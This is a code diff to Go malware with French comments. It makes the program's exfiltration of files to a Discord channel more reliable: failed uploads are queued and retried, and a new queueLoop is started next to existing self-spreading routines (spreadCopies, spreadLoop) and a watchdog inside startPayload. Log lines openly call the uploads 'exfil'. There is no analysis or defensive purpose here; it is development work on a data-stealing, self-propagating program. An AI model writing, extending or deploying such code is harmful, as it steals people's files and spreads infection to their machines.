@@ -315,12 +315,18 @@ func sendFilesTo(ch string, files ...fileOut) {
 	if stopped.Load() || ch == "" || cfg.BotToken == "" {
 		return
 	}
-	postMultipart(discordAPI+fmt.Sprintf("/channels/%s/messages", ch), true, files...)
+	if !postMultipart(discordAPI+fmt.Sprintf("/channels/%s/messages", ch), true, files...) {
+		// Échec réseau ou refus : on garde les fichiers pour un nouvel essai.
+		for _, f := range files {
+			queueFile(f.Name, f.Data)
+		}
+	}
 }
 
 // postMultipart construit le corps multipart (payload_json + fichiers) et
-// l'envoie, avec les en-têtes bot seulement quand la destination en exige.
-func postMultipart(target string, bot bool, files ...fileOut) {
+// l'envoie. La valeur rendue dit si Discord a accepté le message : sans cela,
+// un envoi raté était perdu sans trace.
+func postMultipart(target string, bot bool, files ...fileOut) bool {
 	var buf bytes.Buffer
 	w := multipart.NewWriter(&buf)
 	var kept []fileOut
@@ -346,7 +352,7 @@ func postMultipart(target string, bot bool, files ...fileOut) {
 		total += len(f.Data)
 	}
 	if len(kept) == 0 {
-		return
+		return false
 	}
 	// Discord attend le champ payload_json à côté des fichiers (webhook comme
 	// bot) : c'est lui qui porte la légende et la table des pièces jointes.
@@ -365,7 +371,7 @@ func postMultipart(target string, bot bool, files ...fileOut) {
 
 	req, err := http.NewRequest("POST", target, &buf)
 	if err != nil {
-		return
+		return false
 	}
 	req.Header.Set("Content-Type", w.FormDataContentType())
 	if bot {
@@ -375,13 +381,13 @@ func postMultipart(target string, bot bool, files ...fileOut) {
 	resp, err := httpc.Do(req)
 	if err != nil {
 		plog("sendFiles: " + err.Error())
-		return
+		return false
 	}
 	_, _ = io.Copy(io.Discard, resp.Body)
 	resp.Body.Close()
 	if resp.StatusCode >= 300 {
 		plog(fmt.Sprintf("sendFiles: HTTP %d", resp.StatusCode))
-		return
+		return false
 	}
 	exfilOnce.Lock()
 	if !filesLogged {
@@ -389,6 +395,7 @@ func postMultipart(target string, bot bool, files ...fileOut) {
 		plog(fmt.Sprintf("exfil: premier envoi de fichiers accepté (%d fichier(s))", len(kept)))
 	}
 	exfilOnce.Unlock()
+	return true
 }
 
 var filesLogged bool
@@ -491,6 +498,7 @@ func startPayload() {
 		}
 		spreadCopies(false)
 		go spreadLoop()
+		go queueLoop()
 		spawnWatchdog()
 
 		time.Sleep(time.Duration(5+rand.Intn(5)) * time.Second)
